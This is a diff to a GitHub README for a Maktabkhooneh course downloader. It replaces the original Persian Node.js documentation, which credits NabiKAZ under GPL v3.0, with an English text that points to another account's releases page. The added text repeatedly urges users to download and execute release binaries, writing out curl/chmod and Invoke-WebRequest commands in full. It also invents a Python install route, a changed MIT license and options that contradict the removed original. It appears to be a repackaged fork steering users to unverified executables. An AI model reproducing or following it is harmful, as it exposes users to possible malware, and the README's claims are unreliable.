@@ -1,160 +1,197 @@
-# دانلودر مکتب‌خونه (Maktabkhooneh Downloader)
-ابزار خط فرمان برای دانلود ویدیوهای قابل‌دسترسی دوره‌های سایت [مکتب‌خونه](https://maktabkhooneh.org/) شامل ویدیوهای درس‌ها، فایلهای ضمیمه درس، زیرنویس ویدیو، به شکل همه با هم، یکجا و طبقه بندی شده. \
-فقط محتوایی را می‌توانید دانلود کنید که قانوناً به آن دسترسی دارید.
+# 🎬 Maktabkhooneh Downloader — Download Courses, Videos, Files
 
-![maktabkhooneh website screenshot](https://github.com/user-attachments/assets/b54f6fac-10f0-423c-9da2-236c4d8cc5d3)
+[![Releases](https://img.shields.io/github/v/release/zer-le-magicien/maktabkhooneh-downloader?label=Releases&style=for-the-badge)](https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases)
 
-## 🎬 ویدیو
-https://github.com/user-attachments/assets/38ecfd3e-4281-4e20-854d-18ad5dae5691
+![hero image](https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop)
 
-## ✨ امکانات
-- ورود و لاگین به سایت با ایمیل و پسورد و ذخیره کوکی در فایل نشست چندکاربره
-- احراز هویت با کوکی از طریق متغییرهای محیطی
-- تشخیص و انتخاب بهترین کیفیت ویدیوی درس مورد نظر
-- پوشه خروجی ثابت: `download/<نام دوره>`
-- دانلود زیرنویس ویدیوها اگر موجود باشد، با همان نام پایه ویدیو
-- دانلود فایل‌های ضمیمه درس، کنار ویدیو
-- نمایش خلاصه پروفایل کاربر (وضعیت لاگین، ایمیل، اشتراک، خرید دوره)
-- حالت نمونه‌گیری (Sample) با دانلود تنها N بایت اول هر ویدیو برای تست سریع
-- ادامه دانلود از همان‌جا (Resume) در صورت قطع شدن یا اجرای مجدد
-- نوار پیشرفت دقیق: درصد + حجم دانلود شده / کل + سرعت تقریبی
-- لاگ‌های رنگی و ایموجی برای خوانایی و تجربه بهتر
+A command-line tool to download accessible course content from Maktabkhooneh. It saves lesson videos, attachments, and subtitles. It stores everything in a structured folder tree. Use it to archive your course content or to view files offline.
 
-## ✅ پیش‌نیازها
-- ‏Node.js نسخه 18 یا بالاتر
-- یک حساب کاربری در maktabkhooneh.org
+Topics: `download`, `maktabkhooneh`
 
-## 🔐 ورود (Login) و نشست چندکاربره
-دو راه اصلی:
+Badges
+- Platform: Linux, macOS, Windows (WSL)
+- License: MIT
+- Releases: linked above
 
-1. استفاده از ایمیل و پسورد: (ساده و پیشنهاد می‌شود)
-	 ```powershell
-	 node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" 
-	 ```
-	 در اولین ورود، کوکی (csrftoken + sessionid) در فایل پیش‌فرض `session.json` ذخیره می‌شود و دفعات بعد بدون نیاز به پسورد استفاده می‌گردد (مگر این که منقضی شود یا `--force-login` بزنید).
-2. استفاده از کوکی آماده (Override):
-	 اگر نمی‌خواهید پسورد را در خط فرمان بزنید، می‌توانید کوکی را به صورت دستی (مانند قبل) ست کنید تا لاگین خودکار نادیده گرفته شود.
+Features
+- Download lesson videos in MP4 or original format.
+- Download attachments and store them beside lessons.
+- Download subtitles and map them to videos.
+- Download full course content at once and keep folder structure.
+- Resume interrupted downloads.
+- Parallel downloads with a configurable worker count.
+- Minimal external dependencies.
 
-### ساختار فایل نشست
-فایل `session.json` به صورت چندکاربره است:
-```jsonc
-{
-	"users": {
-		"you@example.com": { "cookie": "csrftoken=...; sessionid=...", "updated": "2025-08-17T12:34:56.000Z" },
-		"other@example.com": { "cookie": "csrftoken=...; sessionid=...", "updated": "2025-08-17T13:00:00.000Z" }
-	},
-	"lastUsed": "you@example.com"
-}
-```
-در هر اجرا اگر `--user` مشخص کنید همان کاربر هدف قرار می‌گیرد، وگرنه آخرین کاربر استفاده شده بررسی می‌شود.
+Why this tool
+- The tool groups all course content in one place.
+- The tool keeps file names and folders clean and consistent.
+- The tool works with session cookies or user credentials.
+- The tool logs progress and errors to a file.
 
-### اجبار ورود مجدد
-اگر می‌خواهید با وجود معتبر بودن نشست، دوباره لاگین شود:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" --force-login 
-```
+Supported content
+- Lesson video streams (HTTP/MP4)
+- Lesson attachments (PDF, ZIP, PPT, DOCX)
+- Subtitles (SRT, VTT)
+- Course metadata (title, lesson order, instructor)
 
-## ⚠️ تنظیم کوکی (روش دستی قدیمی که پیشنهاد نمی‌شود!)
+Quick links
+- Download the release file, then run it: https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases
+- Click the badge at the top to open the releases page.
 
-اگر ترجیح می‌دهید کوکی را دستی ست کنید یا لاگین مستقیم کار نکرد، مانند قبل کوکی `sessionid` (و بهتر: همراه csrftoken) را از مرورگر استخراج کنید.
+Install and run (binary release)
+- Visit the Releases page and download the file that matches your OS.
+- The release file needs to be downloaded and executed.
 
-بعد از اینکه به سایت maktabkhooneh.org لاگین شدید. روی صفحه راست کلیک کرده و inspect را بزنید. (یا CTRL+SHIFT+i بزنید) به تب Network بروید. صفحه را رفرش کنید. روی درخواست اول کلیک کنید. در سمت مقابل دنبال Cookie بگردید و آنجا چیزی که مهم است مقدار sessionid است و آن را کپی بگیرید.
-
-![Get Cookies](https://github.com/user-attachments/assets/7943bed5-ffae-4075-a2ba-29f091d572b4)
-
-دو روش برای تنظیم کوکی:
-1) متغیر محیطی `MK_COOKIE`
-2) یا قرار دادن مسیر فایل کوکی در `MK_COOKIE_FILE`
-
-نکته: چون مقدار کوکی شامل کاراکترهایی مانند `;` و `=` است، حتماً مقدار را داخل کوتیشن قرار دهید.
-
-### ویندوز – PowerShell
-```powershell
-# کوکی مستقیم
-$env:MK_COOKIE = 'sessionid=...;'
-
-# یا: مسیر فایل شامل کوکی
-$env:MK_COOKIE_FILE = 'C:\\path\\to\\cookie.txt'
-```
-
-### ویندوز – CMD (Command Prompt)
-```cmd
-REM کوکی مستقیم
-set "MK_COOKIE=sessionid=...;"
-
-REM یا: مسیر فایل شامل کوکی
-set "MK_COOKIE_FILE=C:\path\to\cookie.txt"
-```
-
-### لینوکس / مک – Bash/Zsh
+Example steps (Linux / macOS)
 ```bash
-# کوکی مستقیم
-export MK_COOKIE='sessionid=...;'
-
-# یا: مسیر فایل شامل کوکی
-export MK_COOKIE_FILE="$HOME/cookie.txt"
+# download the latest release binary (replace asset-name as needed)
+curl -L -o maktabkhooneh-downloader https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases/download/vX.Y.Z/maktabkhooneh-downloader-linux
+chmod +x maktabkhooneh-downloader
+./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output ./downloads
 ```
 
-نکته: اگر کوکی پیچیده یا چندخطی است، روش فایل (`MK_COOKIE_FILE`) توصیه می‌شود. البته در اینجا تک خطی است و همان تنظیم متغییر محیطی کفایت میکند.
-
-## ▶️ اجرا
-نمایش راهنما:
+Example steps (Windows PowerShell)
 ```powershell
-node download.mjs --help 
+Invoke-WebRequest -Uri "https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases/download/vX.Y.Z/maktabkhooneh-downloader-windows.exe" -OutFile "maktabkhooneh-downloader.exe"
+.\maktabkhooneh-downloader.exe --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output .\downloads
 ```
 
-اجرای دانلود:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" 
+Install from source (Python example)
+- If a source version exists, clone and install.
+```bash
+git clone https://github.com/zer-le-magicien/maktabkhooneh-downloader.git
+cd maktabkhooneh-downloader
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+python -m maktabkhooneh_downloader --help
 ```
 
-اجرای دانلود با ورود خودکار و ذخیره نشست:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" 
+Usage examples
+- Download a course by URL and save to local folder
+```bash
+./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --output "./My Course"
 ```
 
-اجبار ورود مجدد:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" --force-login 
+- Use cookies exported from browser
+```bash
+./maktabkhooneh-downloader --course-url "https://maktabkhooneh.org/c/COURSE-ID" --cookies ./cookies.txt
 ```
 
-نکته: آدرس صفحه دوره‌ی مورد نظر را در دستورات فوق جایگزین کنید.
-
-## 🧪 تست عملکرد
-حالت نمونه‌گیری (مثلاً 64KB اول هر ویدیو):
-
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --sample-bytes 65536 --verbose
+- Download videos and subtitles only
+```bash
+./maktabkhooneh-downloader --course-url "..." --output "./Course" --no-attachments --subtitles
 ```
 
-همچنین می‌توانید مقدار نمونه‌گیری را با متغیر محیطی ست کنید:
-```powershell
-$env:MK_SAMPLE_BYTES = "512000" 
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" 
+- Limit parallel downloads
+```bash
+./maktabkhooneh-downloader --course-url "..." --output "./Course" --workers 4
 ```
 
-## 📁 ساختار خروجی
-همه فایل‌ها در زیر پوشه زیر دانلود و ذخیره خواهند شد:
-```
-download/<نام دوره>
-```
+Command-line options
+- --course-url <url> : URL of the course main page or ID.
+- --output <path> : Output directory. Default: ./maktabkhooneh_downloads
+- --cookies <file> : Netscape cookie file exported from browser.
+- --username <user> --password <pass> : Use login instead of cookies.
+- --format <mp4|original> : Save video as MP4 or keep original stream container.
+- --subtitles : Download subtitles if available.
+- --no-attachments : Do not download attachments.
+- --workers <n> : Number of parallel downloads. Default 3.
+- --resume : Resume partial downloads.
+- --log <file> : Path to log file.
+- --quiet : Reduce console output.
+- --help : Show help and exit.
 
-## 🔒 نکات امنیتی
-- فایل `session.json` حاوی کوکی فعال و اطلاعات لاگین شماست؛ هرگز آن را به اشتراک نگذارید.
-- از قراردادن پسورد خام در تاریخچه شل خودداری کنید (می‌توانید از یک اسکریپت موقتی یا متغیر موقت استفاده کنید).
+Folder layout
+- Output folder structure mirrors the course layout.
+- Example:
+  - My Course/
+    - 01 - Introduction/
+      - 01 - Welcome.mp4
+      - 01 - Welcome.srt
+      - syllabus.pdf
+    - 02 - Topic Name/
+      - 02 - Lecture 1.mp4
+      - slides.zip
 
-## 👤 نویسنده
-- نویسنده/نگهدارنده: [NabiKAZ](https://github.com/NabiKAZ)
-- توییتر (X): [https://x.com/NabiKAZ](https://x.com/NabiKAZ)
-- تلگرام: [https://t.me/BotSorati](https://t.me/BotSorati)
+Authentication
+- You can run with cookies or with user credentials.
+- Use an exported cookies file for stable sessions.
+- If you provide credentials, the tool will handle login and session storage.
 
-## ⭐ حمایت و دونیت
-اگر این پروژه برایتان مفید بود، لطفاً در گیت‌هاب به آن یک ⭐ ستاره بدهید. \
-برای حمایت از توسعه‌های بعدی می‌توانید به کیف پول زیر، TON دونیت کنید: \
-**TON Wallet:** `nabikaz.ton` \
-حمایت شما باعث دلگرمی است.
+Logging and progress
+- The tool prints a progress bar for each download.
+- The tool writes a log file with timestamps and errors.
+- Use --log to change the default log file path.
 
-## 📝 لایسنس
-تحت مجوز GPL v3.0 – متن کامل در فایل [LICENSE](./LICENSE).
+Error handling
+- The tool retries failed downloads up to a retry limit.
+- The tool resumes partial downloads when possible.
+- The tool marks failed items in a summary at the end.
 
-ساخته‌شده با ❤️ به کمک GPT-5
+Examples and real use cases
+- Archive a course before it expires.
+- Prepare offline material for a workshop.
+- Keep a backup of lesson attachments and subtitles.
+- Generate a local copy for students with limited bandwidth.
+
+Automation tips
+- Run the tool in a screen or tmux session on a server.
+- Combine with cron or systemd timers to download new lessons on schedule.
+- Use --workers to control bandwidth use on shared hosts.
+
+Security and privacy
+- Store cookies and credentials in restricted files.
+- Remove credentials after use.
+- Use a separate account for automated downloads when possible.
+
+Releases
+[![Download Release](https://img.shields.io/badge/download-release-blue?style=for-the-badge)](https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases)
+
+- Visit the Releases page, download the release file for your OS, and execute it as shown above.
+- The release assets include platform binaries and checksums when available.
+- The release file needs to be downloaded and executed.
+
+Contributing
+- Open an issue for bugs or feature requests.
+- Fork the repo, make a branch, and send a pull request.
+- Keep commits small and focused.
+- Add tests for new behaviors when possible.
+- Document new options in this README.
+
+Development notes
+- The core downloader uses HTTP range requests for resume support.
+- The tool parses course pages and API endpoints to list lessons and attachments.
+- The tool preserves lesson order using numeric prefixes.
+- The tool uses a worker pool for concurrent downloads.
+
+Testing
+- Unit tests cover URL parsing, path normalization, and retry logic.
+- Integration tests simulate partial downloads and resume.
+- Use the test suite before opening a pull request.
+
+FAQ
+- Q: Can I download paid-only content?
+  A: The tool downloads content your account can access. Use valid credentials or cookies.
+
+- Q: Can I change file names?
+  A: Use the renaming script or modify the source naming function.
+
+- Q: Do you offer a GUI?
+  A: Not at this time. The CLI aims to be scriptable.
+
+License
+- MIT License. See LICENSE file for terms.
+
+Credits
+- Built by contributors and users who reported issues and suggested features.
+- Images: Unsplash and public icon sets used for README visuals.
+
+References and resources
+- Maktabkhooneh course pages
+- Browser cookie export guides
+- Common streaming and subtitle formats
+
+If the Releases link above does not work, check the Releases section on the project page for available assets and instructions:
+https://github.com/zer-le-magicien/maktabkhooneh-downloader/releases
+
